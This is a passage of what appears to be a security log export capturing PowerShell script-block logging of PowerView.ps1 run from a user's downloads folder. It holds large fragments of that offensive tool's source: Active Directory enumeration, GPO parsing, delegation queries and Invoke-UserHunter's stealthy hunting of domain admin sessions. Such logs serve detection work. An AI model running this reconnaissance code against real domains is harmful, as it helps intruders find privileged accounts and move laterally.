Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize        if($DFSsearcher) {            $DFSshares = @()            $DFSsearcher.filter = ""(&(objectClass=msDFS-Linkv2))""            $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))            try {                $DFSSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                    $Properties = $_.Properties                    $target_list = $Properties.'msdfs-targetlistv2'[0]                    $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])                    $DFSshares += $xml.targets.ChildNodes | ForEach-Object {                        try {                            $Target = $_.InnerText                            if ( $Target.Contains('\') ) {                                $DFSroot = $Target.split(""\"")[3]                                $ShareName = $Properties.'msdfs-linkpathv2'[0]                                New-Object -TypeName PSObject -Property @{'Name'=""$DFSroot$ShareName"";'RemoteServerName'=$Target.split(""\"")[2]}                            }                        }                        catch {                            Write-Debug ""Error in parsing target : $_""                        }                    }                }            }            catch {                Write-Warning ""Get-DFSshareV2 error : $_""            }            $DFSshares | Sort-Object -Unique -Property ""RemoteServerName""        }    }    $DFSshares = @()        if ( ($Version -eq ""all"") -or ($Version.endsWith(""1"")) ) {        $DFSshares += Get-DFSshareV1 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize    }    if ( ($Version -eq ""all"") -or ($Version.endsWith(""2"")) ) {        $DFSshares += Get-DFSshareV2 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize    }    $DFSshares | Sort-Object -Property ""RemoteServerName""}########################################################## GPO related functions.#########################################################function Get-GptTmpl {<#    .SYNOPSIS        Helper to parse a GptTmpl.inf policy file path into a custom object.    .PARAMETER GptTmplPath        The GptTmpl.inf file path name to parse.     .PARAMETER UsePSDrive        Switch. Mount the target GptTmpl folder path as a temporary PSDrive.    .EXAMPLE        PS C:\> Get-GptTmpl -GptTmplPath ""\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf""        Parse the default domain policy .inf for dev.testlab.local#>    [CmdletBinding()]    Param (        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]        [String]        $GptTmplPath,        [Switch]        $UsePSDrive    )    begin {        if($UsePSDrive) {            # if we're PSDrives, create a temporary mount point            $Parts = $GptTmplPath.split('\')            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'            $FilePath = $Parts[-1]            $RandDrive = (""abcdefghijklmnopqrstuvwxyz"".ToCharArray() | Get-Random -Count 7) -join ''                        Write-Verbose ""Mounting path $GptTmplPath using a temp PSDrive at $RandDrive""            try {                $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop            }            catch {                Write-Debug ""Error mounting path $GptTmplPath : $_""                return $Null            }            # so we can cd/dir the new drive            $GptTmplPath = $RandDrive + "":\"" + $FilePath        }     }    process {        $SectionName = ''        $SectionsTemp = @{}        $SectionsFinal = @{}        try {            if(Test-Path $GptTmplPath) {                Write-Verbose ""Parsing $GptTmplPath""                Get-Content $GptTmplPath -ErrorAction Stop | Foreach-Object {                    if ($_ -match '\[') {                        # this signifies that we're starting a new section                        $SectionName = $_.trim('[]') -replace ' ',''                    }                    elseif($_ -match '=') {                        $Parts = $_.split('=')                        $PropertyName = $Parts[0].trim()                        $PropertyValues = $Parts[1].trim()                        if($PropertyValues -match ',') {                            $PropertyValues = $PropertyValues.split(',')                        }                        if(!$SectionsTemp[$SectionName]) {                            $SectionsTemp.Add($SectionName, @{})                        }                        # add the parsed property into the relevant Section name                        $SectionsTemp[$SectionName].Add( $PropertyName, $PropertyValues )                    }                }                ForEach ($Section in $SectionsTemp.keys) {                    # transform each nested hash table into a custom object                    $SectionsFinal[$Section] = New-Object PSObject -Property $SectionsTemp[$Section]                }                # transform the parent hash table into a custom object                New-Object PSObject -Property $SectionsFinal            }        }        catch {            Write-Debug ""Error parsing $GptTmplPath : $_""        }    }    end {        if($UsePSDrive -and $RandDrive) {            Write-Verbose ""Removing temp PSDrive $RandDrive""            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive        }    }}function Get-GroupsXML {<#    .SYNOPSIS        Helper to parse a groups.xml file path into a custom object.    .PARAMETER GroupsXMLpath        The groups.xml file path name to parse.     .PARAMETER ResolveSids        Switch. Resolve Sids from a DC policy to object names.    .PARAMETER UsePSDrive        Switch. Mount the target groups.xml folder path as a temporary PSDrive.#>    [CmdletBinding()]    Param (        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]        [String]        $GroupsXMLPath,        [Switch]        $ResolveSids,        [Switch]        $UsePSDrive    )    begin {        if($UsePSDrive) {            # if we're PSDrives, create a temporary mount point            $Parts = $GroupsXMLPath.split('\')            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'            $FilePath = $Parts[-1]            $RandDrive = (""abcdefghijklmnopqrstuvwxyz"".ToCharArray() | Get-Random -Count 7) -join ''                        Write-Verbose ""Mounting path $GroupsXMLPath using a temp PSDrive at $RandDrive""            try {                $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop            }            catch {                Write-Debug ""Error mounting path $GroupsXMLPath : $_""                return $Null            }            # so we can cd/dir the new drive            $GroupsXMLPath = $RandDrive + "":\"" + $FilePath        }     }    process {        # parse the Groups.xml file if it exists         if(Test-Path $GroupsXMLPath) {            [xml] $GroupsXMLcontent = Get-Content $GroupsXMLPath            # process all group properties in the XML            $GroupsXMLcontent | Select-Xml ""//Group"" | Select-Object -ExpandProperty node | ForEach-Object {                $Members = @()                $MemberOf = @()                # extract the localgroup sid for memberof                $LocalSid = $_.Properties.GroupSid                if(!$LocalSid) {                    if($_.Properties.groupName -match 'Administrators') {                        $LocalSid = 'S-1-5-32-544'                    }                    elseif($_.Properties.groupName -match 'Remote Desktop') {                        $LocalSid = 'S-1-5-32-555'                    }                    else {                        $LocalSid = $_.Properties.groupName                    }                }                $MemberOf = @($LocalSid)                $_.Properties.members | ForEach-Object {                  ","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"B3V3ypsB8mE-0EyZuX-9","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (18 of 26):e-UserHunter -GroupName ""Power Users"" -Delay 60        Find machines on the domain where members of the ""Power Users"" groups are        logged into with a 60 second (+/- *.3) randomized delay between        touching each host.    .EXAMPLE        PS C:\> Invoke-UserHunter -TargetServer FILESERVER        Query FILESERVER for useres who are effective local administrators using        Get-NetLocalGroup -Recurse, and hunt for that user set on the network.    .EXAMPLE        PS C:\> Invoke-UserHunter -SearchForest        Find all machines in the current forest where domain admins are logged in.    .EXAMPLE        PS C:\> Invoke-UserHunter -Stealth        Executes old Invoke-StealthUserHunter functionality, enumerating commonly        used servers and checking just sessions for each.    .LINK        http://blog.harmj0y.net#>    [CmdletBinding()]    param(        [Parameter(Position=0,ValueFromPipeline=$True)]        [Alias('Hosts')]        [String[]]        $ComputerName,        [ValidateScript({Test-Path -Path $_ })]        [Alias('HostList')]        [String]        $ComputerFile,        [String]        $ComputerFilter,        [String]        $ComputerADSpath,        [Switch]        $Unconstrained,        [String]        $GroupName = 'Domain Admins',        [String]        $TargetServer,        [String]        $UserName,        [String]        $UserFilter,        [String]        $UserADSpath,        [ValidateScript({Test-Path -Path $_ })]        [String]        $UserFile,        [Switch]        $AdminCount,        [Switch]        $AllowDelegation,        [Switch]        $CheckAccess,        [Switch]        $StopOnSuccess,        [Switch]        $NoPing,        [UInt32]        $Delay = 0,        [Double]        $Jitter = .3,        [String]        $Domain,        [String]        $DomainController,        [Switch]        $ShowAll,        [Switch]        $SearchForest,        [Switch]        $Stealth,        [String]        [ValidateSet(""DFS"",""DC"",""File"",""All"")]        $StealthSource =""All"",        [Switch]        $ForeignUsers,        [ValidateRange(1,100)]         [Int]        $Threads    )    begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }        # random object for delay        $RandNo = New-Object System.Random        Write-Verbose ""[*] Running Invoke-UserHunter with delay of $Delay""        if($Domain) {            $TargetDomains = @($Domain)        }        elseif($SearchForest) {            # get ALL the domains in the forest to search            $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }        }        else {            # use the local domain            $TargetDomains = @( (Get-NetDomain).name )        }        #####################################################        #        # First we build the host target set        #        #####################################################        if(!$ComputerName) {             [Array]$ComputerName = @()                        if($ComputerFile) {                # if we're using a host list, read the targets in and add them to the target list                $ComputerName = Get-Content -Path $ComputerFile            }            elseif($Stealth) {                Write-Verbose ""Stealth mode! Enumerating commonly used servers""                Write-Verbose ""Stealth source: $StealthSource""                ForEach ($Domain in $TargetDomains) {                    if (($StealthSource -eq ""File"") -or ($StealthSource -eq ""All"")) {                        Write-Verbose ""[*] Querying domain $Domain for File Servers...""                        $ComputerName += Get-NetFileServer -Domain $Domain -DomainController $DomainController                    }                    if (($StealthSource -eq ""DFS"") -or ($StealthSource -eq ""All"")) {                        Write-Verbose ""[*] Querying domain $Domain for DFS Servers...""                        $ComputerName += Get-DFSshare -Domain $Domain -DomainController $DomainController | ForEach-Object {$_.RemoteServerName}                    }                    if (($StealthSource -eq ""DC"") -or ($StealthSource -eq ""All"")) {                        Write-Verbose ""[*] Querying domain $Domain for Domain Controllers...""                        $ComputerName += Get-NetDomainController -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}                    }                }            }            else {                ForEach ($Domain in $TargetDomains) {                    Write-Verbose ""[*] Querying domain $Domain for hosts""                    $Arguments = @{                        'Domain' = $Domain                        'DomainController' = $DomainController                        'ADSpath' = $ADSpath                        'Filter' = $ComputerFilter                        'Unconstrained' = $Unconstrained                    }                    $ComputerName += Get-NetComputer @Arguments                }            }            # remove any null target hosts, uniquify the list and shuffle it            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }            if($($ComputerName.Count) -eq 0) {                throw ""No hosts found!""            }        }        #####################################################        #        # Now we build the user target set        #        #####################################################        # users we're going to be searching for        $TargetUsers = @()        # get the current user so we can ignore it in the results        $CurrentUser = ([Environment]::UserName).toLower()        # if we're showing all results, skip username enumeration        if($ShowAll -or $ForeignUsers) {            $User = New-Object PSObject            $User | Add-Member Noteproperty 'MemberDomain' $Null            $User | Add-Member Noteproperty 'MemberName' '*'            $TargetUsers = @($User)            if($ForeignUsers) {                # if we're searching for user results not in the primary domain                $krbtgtName = Convert-CanonicaltoNT4 -ObjectName ""krbtgt@$($Domain)""                $DomainShortName = $krbtgtName.split(""\"")[0]            }        }        # if we want to hunt for the effective domain users who can access a target server        elseif($TargetServer) {            Write-Verbose ""Querying target server '$TargetServer' for local users""            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {                $User = New-Object PSObject                $User | Add-Member Noteproperty 'MemberDomain' ($_.AccountName).split(""/"")[0].toLower()                 $User | Add-Member Noteproperty 'MemberName' ($_.AccountName).split(""/"")[1].toLower()                 $User            }  | Where-Object {$_}        }        # if we get a specific username, only use that        elseif($UserName) {            Write-Verbose ""[*] Using target user '$UserName'...""            $User = New-Object PSObject            $User | Add-Member Noteproperty 'MemberDomain' $TargetDomains[0]            $User | Add-Member Noteproperty 'MemberName' $UserName.ToLower()            $TargetUsers = @($User)        }        # read in a target user list if we have one        elseif($UserFile) {            $TargetUsers = Get-Content -Path $UserFile | ForEach-Object {                $User = New-Object PSObject                $User | Add-Member Noteproperty 'MemberDomain' $TargetDomains[0]                $User | Add-Member Noteproperty 'MemberName' $_                $User            }  | Where-Object {$_}        }        elseif($UserADSpath -or $UserFilter -or $AdminCount) {            ForEach ($Domain in $TargetDomains) {                $Arguments = @{                    'Domain' = $Domain                    'DomainController' = $DomainController                    'ADSpath' = $UserADSpath                    'Filter' = $UserFilter                    'AdminCount' = $AdminCount                    'AllowDelegation' = $AllowDelegation                }                Write-Verbose ""[*] Querying domain $Domain for users""                $TargetUsers += Get-NetUser @Arguments | ForEach-Object {                    $User = New-Object PSObject                    $User | Add-Member Noteproperty 'MemberDomain' $Domain                    $User | Add-Member Noteproperty 'MemberName' $_.samaccountname                    $User                }  | Where-Object {$_}            }                    }        else {            ForEach ($Domain in $TargetDomains) {                Write-Verbose ""[*] Querying domain $Domain for users of group '$GroupName'""                $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController            }        }        if (( (-not $ShowAll) -and (-not $ForeignUsers) ) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {            throw ""[!] No users found to search for!""        }        # script block that enumerates a server        $HostEnumBlock = {            param($ComputerName, $Ping, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName)            # optionally check if the server is up first            $Up = $True            if($Ping) {                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName            }            if($Up) {                if(!$DomainShortName) {                    # if we're not searching for foreign users, check session information                    $Sessions = Get-NetSession -ComputerName $ComputerName                    ForEach ($Session in $Sessions) {                        $UserName = $Session.sesi10_username                        $CName = $Session.sesi10_cname                        if($CName -and $CName.StartsWith(""\\"")) {                            $CName = $CName.TrimStart(""\"")                        }                        # make sure we have a result                        if (($UserName) -and ($UserName.trim() -ne '') -and (!($UserName -match $CurrentUser))) {                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {                                $IP = Get-IPAddress -ComputerName $ComputerName                                $FoundUser = New-Object PSObject                                $FoundUser | Add-Member Noteproperty 'UserDomain' $_.MemberDomain                                $FoundUser | Add-Member Noteproperty 'UserName' $UserName                                $FoundUser | Add-Member Noteproperty 'ComputerName' $ComputerName                                $FoundUser | Add-Member Noteproperty 'IP' $IP                                $FoundUser | Add-Member Noteproperty 'SessionFrom' $CName                                # see if we're checking to see if we have local admin access on this machine                                if ($CheckAccess) {                                    $Admin = Invoke-CheckLocalAdminAccess -ComputerName $CName                                    $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Admin                                }                                else {                                    $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Null                                }                                $FoundUser                            }                        }                                                        }                }                if(!$Stealth) {                    # if we're not 'stealthy', enumerate loggedon users as well                    $LoggedOn = Get-NetLoggedon -ComputerName $ComputerName                    ForEach ($User in $LoggedOn) {                        $UserName = $User.wkui1_username                        # TODO: translate domain to authoratative name                        #   then match domain name ?                        $UserDomain = $User.wkui1_logon_domain                        # make sure wet have a result                        if (($UserName) -and ($UserName.trim() -ne '')) {                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {                                $Proceed = $True                                if($DomainShortName) {                                    if ($DomainShortName.ToLower() -ne $UserDomain.ToLower()) {                                        $Proceed = $True                                    }                                    else {                                        $Proceed = $False                                    }                                }                                if($Proceed) {                                    $IP = Get-IPAddress -ComputerName $ComputerName                                    $FoundUser = New-Object PSObject                                    $FoundUser | Add-Member Noteproperty 'UserDomain' $UserDomain                                    $FoundUser | Add-Member Noteproperty 'UserName' $UserName                                    $FoundUser | Add-Member Noteproperty 'ComputerName' $ComputerName                                    $FoundUser | Add-Member Noteproperty 'IP' $IP                                    $FoundUser | Add-Member Noteproperty 'SessionFrom' $Null                                    # see if we're checking to see if we have local admin access on this machine                                    if ($CheckAccess) {                                        $Admin = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName                                        $FoundUser | Add-Member Noteproperty 'LScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","e-UserHunter -GroupName ""Power Users"" -Delay 60        Find machines on the domain where members of the ""Power Users"" groups are        logged into with a 60 second (+/- *.3) randomized delay between        touching each host.    .EXAMPLE        PS C:\> Invoke-UserHunter -TargetServer FILESERVER        Query FILESERVER for useres who are effective local administrators using        Get-NetLocalGroup -Recurse, and hunt for that user set on the network.    .EXAMPLE        PS C:\> Invoke-UserHunter -SearchForest        Find all machines in the current forest where domain admins are logged in.    .EXAMPLE        PS C:\> Invoke-UserHunter -Stealth        Executes old Invoke-StealthUserHunter functionality, enumerating commonly        used servers and checking just sessions for each.    .LINK        http://blog.harmj0y.net#>    [CmdletBinding()]    param(        [Parameter(Position=0,ValueFromPipeline=$True)]        [Alias('Hosts')]        [String[]]        $ComputerName,        [ValidateScript({Test-Path -Path $_ })]        [Alias('HostList')]        [String]        $ComputerFile,        [String]        $ComputerFilter,        [String]        $ComputerADSpath,        [Switch]        $Unconstrained,        [String]        $GroupName = 'Domain Admins',        [String]        $TargetServer,        [String]        $UserName,        [String]        $UserFilter,        [String]        $UserADSpath,        [ValidateScript({Test-Path -Path $_ })]        [String]        $UserFile,        [Switch]        $AdminCount,        [Switch]        $AllowDelegation,        [Switch]        $CheckAccess,        [Switch]        $StopOnSuccess,        [Switch]        $NoPing,        [UInt32]        $Delay = 0,        [Double]        $Jitter = .3,        [String]        $Domain,        [String]        $DomainController,        [Switch]        $ShowAll,        [Switch]        $SearchForest,        [Switch]        $Stealth,        [String]        [ValidateSet(""DFS"",""DC"",""File"",""All"")]        $StealthSource =""All"",        [Switch]        $ForeignUsers,        [ValidateRange(1,100)]         [Int]        $Threads    )    begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }        # random object for delay        $RandNo = New-Object System.Random        Write-Verbose ""[*] Running Invoke-UserHunter with delay of $Delay""        if($Domain) {            $TargetDomains = @($Domain)        }        elseif($SearchForest) {            # get ALL the domains in the forest to search            $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }        }        else {            # use the local domain            $TargetDomains = @( (Get-NetDomain).name )        }        #####################################################        #        # First we build the host target set        #        #####################################################        if(!$ComputerName) {             [Array]$ComputerName = @()                        if($ComputerFile) {                # if we're using a host list, read the targets in and add them to the target list                $ComputerName = Get-Content -Path $ComputerFile            }            elseif($Stealth) {                Write-Verbose ""Stealth mode! Enumerating commonly used servers""                Write-Verbose ""Stealth source: $StealthSource""                ForEach ($Domain in $TargetDomains) {                    if (($StealthSource -eq ""File"") -or ($StealthSource -eq ""All"")) {                        Write-Verbose ""[*] Querying domain $Domain for File Servers...""                        $ComputerName += Get-NetFileServer -Domain $Domain -DomainController $DomainController                    }                    if (($StealthSource -eq ""DFS"") -or ($StealthSource -eq ""All"")) {                        Write-Verbose ""[*] Querying domain $Domain for DFS Servers...""                        $ComputerName += Get-DFSshare -Domain $Domain -DomainController $DomainController | ForEach-Object {$_.RemoteServerName}                    }                    if (($StealthSource -eq ""DC"") -or ($StealthSource -eq ""All"")) {                        Write-Verbose ""[*] Querying domain $Domain for Domain Controllers...""                        $ComputerName += Get-NetDomainController -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}                    }                }            }            else {                ForEach ($Domain in $TargetDomains) {                    Write-Verbose ""[*] Querying domain $Domain for hosts""                    $Arguments = @{                        'Domain' = $Domain                        'DomainController' = $DomainController                        'ADSpath' = $ADSpath                        'Filter' = $ComputerFilter                        'Unconstrained' = $Unconstrained                    }                    $ComputerName += Get-NetComputer @Arguments                }            }            # remove any null target hosts, uniquify the list and shuffle it            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }            if($($ComputerName.Count) -eq 0) {                throw ""No hosts found!""            }        }        #####################################################        #        # Now we build the user target set        #        #####################################################        # users we're going to be searching for        $TargetUsers = @()        # get the current user so we can ignore it in the results        $CurrentUser = ([Environment]::UserName).toLower()        # if we're showing all results, skip username enumeration        if($ShowAll -or $ForeignUsers) {            $User = New-Object PSObject            $User | Add-Member Noteproperty 'MemberDomain' $Null            $User | Add-Member Noteproperty 'MemberName' '*'            $TargetUsers = @($User)            if($ForeignUsers) {                # if we're searching for user results not in the primary domain                $krbtgtName = Convert-CanonicaltoNT4 -ObjectName ""krbtgt@$($Domain)""                $DomainShortName = $krbtgtName.split(""\"")[0]            }        }        # if we want to hunt for the effective domain users who can access a target server        elseif($TargetServer) {            Write-Verbose ""Querying target server '$TargetServer' for local users""            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {                $User = New-Object PSObject                $User | Add-Member Noteproperty 'MemberDomain' ($_.AccountName).split(""/"")[0].toLower()                 $User | Add-Member Noteproperty 'MemberName' ($_.AccountName).split(""/"")[1].toLower()                 $User            }  | Where-Object {$_}        }        # if we get a specific username, only use that        elseif($UserName) {            Write-Verbose ""[*] Using target user '$UserName'...""            $User = New-Object PSObject            $User | Add-Member Noteproperty 'MemberDomain' $TargetDomains[0]            $User | Add-Member Noteproperty 'MemberName' $UserName.ToLower()            $TargetUsers = @($User)        }        # read in a target user list if we have one        elseif($UserFile) {            $TargetUsers = Get-Content -Path $UserFile | ForEach-Object {                $User = New-Object PSObject                $User | Add-Member Noteproperty 'MemberDomain' $TargetDomains[0]                $User | Add-Member Noteproperty 'MemberName' $_                $User            }  | Where-Object {$_}        }        elseif($UserADSpath -or $UserFilter -or $AdminCount) {            ForEach ($Domain in $TargetDomains) {                $Arguments = @{                    'Domain' = $Domain                    'DomainController' = $DomainController                    'ADSpath' = $UserADSpath                    'Filter' = $UserFilter                    'AdminCount' = $AdminCount                    'AllowDelegation' = $AllowDelegation                }                Write-Verbose ""[*] Querying domain $Domain for users""                $TargetUsers += Get-NetUser @Arguments | ForEach-Object {                    $User = New-Object PSObject                    $User | Add-Member Noteproperty 'MemberDomain' $Domain                    $User | Add-Member Noteproperty 'MemberName' $_.samaccountname                    $User                }  | Where-Object {$_}            }                    }        else {            ForEach ($Domain in $TargetDomains) {                Write-Verbose ""[*] Querying domain $Domain for users of group '$GroupName'""                $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController            }        }        if (( (-not $ShowAll) -and (-not $ForeignUsers) ) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {            throw ""[!] No users found to search for!""        }        # script block that enumerates a server        $HostEnumBlock = {            param($ComputerName, $Ping, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName)            # optionally check if the server is up first            $Up = $True            if($Ping) {                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName            }            if($Up) {                if(!$DomainShortName) {                    # if we're not searching for foreign users, check session information                    $Sessions = Get-NetSession -ComputerName $ComputerName                    ForEach ($Session in $Sessions) {                        $UserName = $Session.sesi10_username                        $CName = $Session.sesi10_cname                        if($CName -and $CName.StartsWith(""\\"")) {                            $CName = $CName.TrimStart(""\"")                        }                        # make sure we have a result                        if (($UserName) -and ($UserName.trim() -ne '') -and (!($UserName -match $CurrentUser))) {                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {                                $IP = Get-IPAddress -ComputerName $ComputerName                                $FoundUser = New-Object PSObject                                $FoundUser | Add-Member Noteproperty 'UserDomain' $_.MemberDomain                                $FoundUser | Add-Member Noteproperty 'UserName' $UserName                                $FoundUser | Add-Member Noteproperty 'ComputerName' $ComputerName                                $FoundUser | Add-Member Noteproperty 'IP' $IP                                $FoundUser | Add-Member Noteproperty 'SessionFrom' $CName                                # see if we're checking to see if we have local admin access on this machine                                if ($CheckAccess) {                                    $Admin = Invoke-CheckLocalAdminAccess -ComputerName $CName                                    $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Admin                                }                                else {                                    $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Null                                }                                $FoundUser                            }                        }                                                        }                }                if(!$Stealth) {                    # if we're not 'stealthy', enumerate loggedon users as well                    $LoggedOn = Get-NetLoggedon -ComputerName $ComputerName                    ForEach ($User in $LoggedOn) {                        $UserName = $User.wkui1_username                        # TODO: translate domain to authoratative name                        #   then match domain name ?                        $UserDomain = $User.wkui1_logon_domain                        # make sure wet have a result                        if (($UserName) -and ($UserName.trim() -ne '')) {                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {                                $Proceed = $True                                if($DomainShortName) {                                    if ($DomainShortName.ToLower() -ne $UserDomain.ToLower()) {                                        $Proceed = $True                                    }                                    else {                                        $Proceed = $False                                    }                                }                                if($Proceed) {                                    $IP = Get-IPAddress -ComputerName $ComputerName                                    $FoundUser = New-Object PSObject                                    $FoundUser | Add-Member Noteproperty 'UserDomain' $UserDomain                                    $FoundUser | Add-Member Noteproperty 'UserName' $UserName                                    $FoundUser | Add-Member Noteproperty 'ComputerName' $ComputerName                                    $FoundUser | Add-Member Noteproperty 'IP' $IP                                    $FoundUser | Add-Member Noteproperty 'SessionFrom' $Null                                    # see if we're checking to see if we have local admin access on this machine                                    if ($CheckAccess) {                                        $Admin = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName                                        $FoundUser | Add-Member Noteproperty 'L","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"D3V3ypsB8mE-0EyZ4H_o","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (8 of 26):S        This function utilizes adsisearcher to query the current AD context        for current computer objects. Based off of Carlos Perez's Audit.psm1        script in Posh-SecMod (link below).    .PARAMETER ComputerName        Return computers with a specific name, wildcards accepted.    .PARAMETER SPN        Return computers with a specific service principal name, wildcards accepted.    .PARAMETER OperatingSystem        Return computers with a specific operating system, wildcards accepted.    .PARAMETER ServicePack        Return computers with a specific service pack, wildcards accepted.    .PARAMETER Filter        A customized ldap filter string to use, e.g. ""(description=*admin*)""    .PARAMETER Printers        Switch. Return only printers.    .PARAMETER Ping        Switch. Ping each host to ensure it's up before enumerating.    .PARAMETER FullData        Switch. Return full computer objects instead of just system names (the default).    .PARAMETER Domain        The domain to query for computers, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER Unconstrained        Switch. Return computer objects that have unconstrained delegation.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetComputer                Returns the current computers in current domain.    .EXAMPLE        PS C:\> Get-NetComputer -SPN mssql*                Returns all MS SQL servers on the domain.    .EXAMPLE        PS C:\> Get-NetComputer -Domain testing                Returns the current computers in 'testing' domain.    .EXAMPLE        PS C:\> Get-NetComputer -Domain testing -FullData                Returns full computer objects in the 'testing' domain.    .LINK        https://github.com/darkoperator/Posh-SecMod/blob/master/Audit/Audit.psm1#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [Alias('HostName')]        [String]        $ComputerName = '*',        [String]        $SPN,        [String]        $OperatingSystem,        [String]        $ServicePack,        [String]        $Filter,        [Switch]        $Printers,        [Switch]        $Ping,        [Switch]        $FullData,        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [Switch]        $Unconstrained,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        # so this isn't repeated if users are passed on the pipeline        $CompSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize    }    process {        if ($CompSearcher) {            # if we're checking for unconstrained delegation            if($Unconstrained) {                Write-Verbose ""Searching for computers with for unconstrained delegation""                $Filter += ""(userAccountControl:1.2.840.113556.1.4.803:=524288)""            }            # set the filters for the seracher if it exists            if($Printers) {                Write-Verbose ""Searching for printers""                # $CompSearcher.filter=""(&(objectCategory=printQueue)$Filter)""                $Filter += ""(objectCategory=printQueue)""            }            if($SPN) {                Write-Verbose ""Searching for computers with SPN: $SPN""                $Filter += ""(servicePrincipalName=$SPN)""            }            if($OperatingSystem) {                $Filter += ""(operatingsystem=$OperatingSystem)""            }            if($ServicePack) {                $Filter += ""(operatingsystemservicepack=$ServicePack)""            }            $CompSearcher.filter = ""(&(sAMAccountType=805306369)(dnshostname=$ComputerName)$Filter)""            try {                $CompSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                    $Up = $True                    if($Ping) {                        # TODO: how can these results be piped to ping for a speedup?                        $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname                    }                    if($Up) {                        # return full data objects                        if ($FullData) {                            # convert/process the LDAP fields for each result                            Convert-LDAPProperty -Properties $_.Properties                        }                        else {                            # otherwise we're just returning the DNS host name                            $_.properties.dnshostname                        }                    }                }            }            catch {                Write-Warning ""Error: $_""            }        }    }}function Get-ADObject {<#    .SYNOPSIS        Takes a domain SID and returns the user, group, or computer object        associated with it.    .PARAMETER SID        The SID of the domain object you're querying for.    .PARAMETER Name        The Name of the domain object you're querying for.    .PARAMETER SamAccountName        The SamAccountName of the domain object you're querying for.     .PARAMETER Domain        The domain to query for objects, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER Filter        Additional LDAP filter string for the query.    .PARAMETER ReturnRaw        Switch. Return the raw object instead of translating its properties.        Used by Set-ADObject to modify object properties.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-ADObject -SID ""S-1-5-21-2620891829-2411261497-1773853088-1110""                Get the domain object associated with the specified SID.            .EXAMPLE        PS C:\> Get-ADObject -ADSpath ""CN=AdminSDHolder,CN=System,DC=testlab,DC=local""                Get the AdminSDHolder object for the testlab.local domain.#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        